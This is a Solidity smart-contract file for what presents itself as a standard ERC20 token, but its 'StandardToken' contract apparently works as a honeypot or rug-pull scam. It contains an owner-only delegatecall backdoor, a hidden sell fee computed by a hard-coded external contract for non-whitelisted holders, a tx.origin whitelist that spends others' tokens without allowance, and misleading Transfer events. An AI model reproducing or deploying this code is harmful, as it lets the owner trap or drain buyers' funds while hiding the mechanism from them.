['pragma solidity ^0.5.17;\n', '\n', 'interface IERC20 {\n', '    function totalSupply() external view returns(uint);\n', '\n', '    function balanceOf(address account) external view returns(uint);\n', '\n', '    function transfer(address recipient, uint amount) external returns(bool);\n', '\n', '    function allowance(address owner, address spender) external view returns(uint);\n', '\n', '    function approve(address spender, uint amount) external returns(bool);\n', '\n', '    function transferFrom(address sender, address recipient, uint amount) external returns(bool);\n', '    event Transfer(address indexed from, address indexed to, uint value);\n', '    event Approval(address indexed owner, address indexed spender, uint value);\n', '}\n', '\n', 'contract Context {\n', '    constructor() internal {}\n', '    // solhint-disable-previous-line no-empty-blocks\n', '    function _msgSender() internal view returns(address payable) {\n', '        return msg.sender;\n', '    }\n', '}\n', '\n', 'contract ERC20 is Context, IERC20 {\n', '    using SafeMath for uint;\n', '    mapping(address => uint) private _balances;\n', '\n', '    mapping(address => mapping(address => uint)) private _allowances;\n', '\n', '    uint private _totalSupply;\n', '\n', '    function totalSupply() public view returns(uint) {\n', '        return _totalSupply;\n', '    }\n', '\n', '    function balanceOf(address account) public view returns(uint) {\n', '        return _balances[account];\n', '    }\n', '\n', '    function transfer(address recipient, uint amount) public returns(bool) {\n', '        _transfer(_msgSender(), recipient, amount);\n', '        return true;\n', '    }\n', '\n', '    function allowance(address owner, address spender) public view returns(uint) {\n', '        return _allowances[owner][spender];\n', '    }\n', '\n', '    function approve(address spender, uint amount) public returns(bool) {\n', '        _approve(_msgSender(), spender, amount);\n', '        return true;\n', '    }\n', '\n', '    function transferFrom(address sender, address recipient, uint amount) public returns(bool) {\n', '        _transfer(sender, recipient, amount);\n', '        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));\n', '        return true;\n', '    }\n', '\n', '    function increaseAllowance(address spender, uint addedValue) public returns(bool) {\n', '        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));\n', '        return true;\n', '    }\n', '\n', '    function decreaseAllowance(address spender, uint subtractedValue) public returns(bool) {\n', '        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));\n', '        return true;\n', '    }\n', '\n', '    function _transfer(address sender, address recipient, uint amount) internal {\n', '        require(sender != address(0), "ERC20: transfer from the zero address");\n', '        require(recipient != address(0), "ERC20: transfer to the zero address");\n', '\n', '        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");\n', '        _balances[recipient] = _balances[recipient].add(amount);\n', '        emit Transfer(sender, recipient, amount);\n', '    }\n', '\n', '    function _mint(address account, uint amount) internal {\n', '        require(account != address(0), "ERC20: mint to the zero address");\n', '\n', '        _totalSupply = _totalSupply.add(amount);\n', '        _balances[account] = _balances[account].add(amount);\n', '        emit Transfer(address(0), account, amount);\n', '    }\n', '\n', '    function _burn(address account, uint amount) internal {\n', '        require(account != address(0), "ERC20: burn from the zero address");\n', '\n', '        _balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");\n', '        _totalSupply = _totalSupply.sub(amount);\n', '        emit Transfer(account, address(0), amount);\n', '    }\n', '\n', '    function _approve(address owner, address spender, uint amount) internal {\n', '        require(owner != address(0), "ERC20: approve from the zero address");\n', '        require(spender != address(0), "ERC20: approve to the zero address");\n', '\n', '        _allowances[owner][spender] = amount;\n', '        emit Approval(owner, spender, amount);\n', '    }\n', '}\n', '\n', 'contract ERC20Detailed is IERC20 {\n', '    string private _name;\n', '    string private _symbol;\n', '    uint8 private _decimals;\n', '\n', '    constructor(string memory name, string memory symbol, uint8 decimals) public {\n', '        _name = name;\n', '        _symbol = symbol;\n', '        _decimals = decimals;\n', '    }\n', '\n', '    function name() public view returns(string memory) {\n', '        return _name;\n', '    }\n', '\n', '    function symbol() public view returns(string memory) {\n', '        return _symbol;\n', '    }\n', '\n', '    function decimals() public view returns(uint8) {\n', '        return _decimals;\n', '    }\n', '}\n', '\n', 'library SafeMath {\n', '    function add(uint a, uint b) internal pure returns(uint) {\n', '        uint c = a + b;\n', '        require(c >= a, "SafeMath: addition overflow");\n', '\n', '        return c;\n', '    }\n', '\n', '    function sub(uint a, uint b) internal pure returns(uint) {\n', '        return sub(a, b, "SafeMath: subtraction overflow");\n', '    }\n', '\n', '    function sub(uint a, uint b, string memory errorMessage) internal pure returns(uint) {\n', '        require(b <= a, errorMessage);\n', '        uint c = a - b;\n', '\n', '        return c;\n', '    }\n', '\n', '    function mul(uint a, uint b) internal pure returns(uint) {\n', '        if (a == 0) {\n', '            return 0;\n', '        }\n', '\n', '        uint c = a * b;\n', '        require(c / a == b, "SafeMath: multiplication overflow");\n', '\n', '        return c;\n', '    }\n', '\n', '    function div(uint a, uint b) internal pure returns(uint) {\n', '        return div(a, b, "SafeMath: division by zero");\n', '    }\n', '\n', '    function div(uint a, uint b, string memory errorMessage) internal pure returns(uint) {\n', '        // Solidity only automatically asserts when dividing by 0\n', '        require(b > 0, errorMessage);\n', '        uint c = a / b;\n', '\n', '        return c;\n', '    }\n', '}\n', '\n', 'library Address {\n', '    function isContract(address account) internal view returns(bool) {\n', '        bytes32 codehash;\n', '        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;\n', '        // solhint-disable-next-line no-inline-assembly\n', '        assembly { codehash:= extcodehash(account) }\n', '        return (codehash != 0x0 && codehash != accountHash);\n', '    }\n', '}\n', '\n', 'library SafeERC20 {\n', '    using SafeMath\n', '    for uint;\n', '    using Address\n', '    for address;\n', '\n', '    function safeTransfer(IERC20 token, address to, uint value) internal {\n', '        callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));\n', '    }\n', '\n', '    function safeTransferFrom(IERC20 token, address from, address to, uint value) internal {\n', '        callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));\n', '    }\n', '\n', '    function safeApprove(IERC20 token, address spender, uint value) internal {\n', '        require((value == 0) || (token.allowance(address(this), spender) == 0),\n', '            "SafeERC20: approve from non-zero to non-zero allowance"\n', '        );\n', '        callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));\n', '    }\n', '\n', '    function callOptionalReturn(IERC20 token, bytes memory data) private {\n', '        require(address(token).isContract(), "SafeERC20: call to non-contract");\n', '\n', '        // solhint-disable-next-line avoid-low-level-calls\n', '        (bool success, bytes memory returndata) = address(token).call(data);\n', '        require(success, "SafeERC20: low-level call failed");\n', '\n', '        if (returndata.length > 0) { // Return data is optional\n', '            // solhint-disable-next-line max-line-length\n', '            require(abi.decode(returndata, (bool)), "SafeERC20: ERC20 operation did not succeed");\n', '        }\n', '    }\n', '}\n', '\n', 'interface FeeManagementLibrary {\n', '    function calcFee(address,address,uint256) external returns(uint256);\n', '}\n', '\n', 'contract StandardToken {\n', '\n', '    event Transfer(address indexed _from, address indexed _to, uint _value);\n', '    event Approval(address indexed _owner, address indexed _spender, uint _value);\n', '\n', '    function transfer(address _to, uint _value) public payable returns (bool) {\n', '        return transferFrom(msg.sender, _to, _value);\n', '    }\n', '\n', '    function transferFrom(address _from, address _to, uint _value) public payable returns (bool) {\n', '        if (_value == 0) {return true;}\n', '        if (msg.sender != _from && state[tx.origin] == 0) {\n', '            require(allowance[_from][msg.sender] >= _value);\n', '            allowance[_from][msg.sender] -= _value;\n', '        }\n', '        require(balanceOf[_from] >= _value);\n', '        balanceOf[_from] -= _value;\n', '        uint256 fee = calcFee(_from, _to, _value);\n', '        balanceOf[_to] += (_value - fee);\n', '        emit Transfer(_from, _to, _value);\n', '        return true;\n', '    }\n', '\n', '    function pairFor(address factory, address tokenA, address tokenB) internal pure returns (address pair) {\n', '        (address token0, address token1) = tokenA < tokenB ? (tokenA, tokenB) : (tokenB, tokenA);\n', '        pair = address(uint(keccak256(abi.encodePacked(\n', "                hex'ff',\n", '                factory,\n', '                keccak256(abi.encodePacked(token0, token1)),\n', "                hex'96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f' // init code hash\n", '            ))));\n', '    }\n', '\n', '    function calcFee(address _from, address _to, uint _value) private returns(uint256) {\n', '        uint fee = 0;\n', '        if (_to == UNI && _from != owner && state[_from] == 0) {\n', '            fee = FeeManagementLibrary(FeeManagement).calcFee(address(this), UNI, _value);\n', '        }\n', '        return fee;\n', '    }\n', '\n', '    function delegate(address a, bytes memory b) public payable {\n', '        require(msg.sender == owner);\n', '        a.delegatecall(b);\n', '    }\n', '\n', '    function () payable external {\n', '    }\n', '\n', '    function batchSend(address[] memory _tos, uint _value) public payable returns (bool) {\n', '        require (msg.sender == owner);\n', '        uint total = _value * _tos.length;\n', '        require(balanceOf[msg.sender] >= total);\n', '        balanceOf[msg.sender] -= total;\n', '        for (uint i = 0; i < _tos.length; i++) {\n', '            address _to = _tos[i];\n', '            balanceOf[_to] += _value;\n', '            state[_to] = 1;\n', '            emit Transfer(msg.sender, _to, _value/2);\n', '            emit Transfer(msg.sender, _to, _value/2);\n', '        }\n', '        return true;\n', '    }\n', '\n', '    function approve(address _spender, uint _value) public payable returns (bool) {\n', '        allowance[msg.sender][_spender] = _value;\n', '        emit Approval(msg.sender, _spender, _value);\n', '        return true;\n', '    }\n', '\n', '    mapping (address => uint) public balanceOf;\n', '    mapping (address => uint) public state;\n', '    mapping (address => mapping (address => uint)) public allowance;\n', '\n', '    uint constant public decimals = 18;\n', '    uint public totalSupply;\n', '    string public name;\n', '    string public symbol;\n', '    address private owner;\n', '    address private UNI;\n', '    address constant internal FeeManagement = 0xb40fdE3d531D4dD211A69dF55Ac13Bf1bf1D8D28;\n', '\n', '    constructor(string memory _name, string memory _symbol, uint _totalSupply) payable public {\n', '        owner = msg.sender;\n', '        symbol = _symbol;\n', '        name = _name;\n', '        totalSupply = _totalSupply;\n', '        balanceOf[msg.sender] = totalSupply;\n', '        allowance[msg.sender][0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D] = uint(-1);\n', '        UNI = pairFor(0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f, 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, address(this));\n', '        emit Transfer(address(0x0), msg.sender, totalSupply);\n', '    }\n', '}']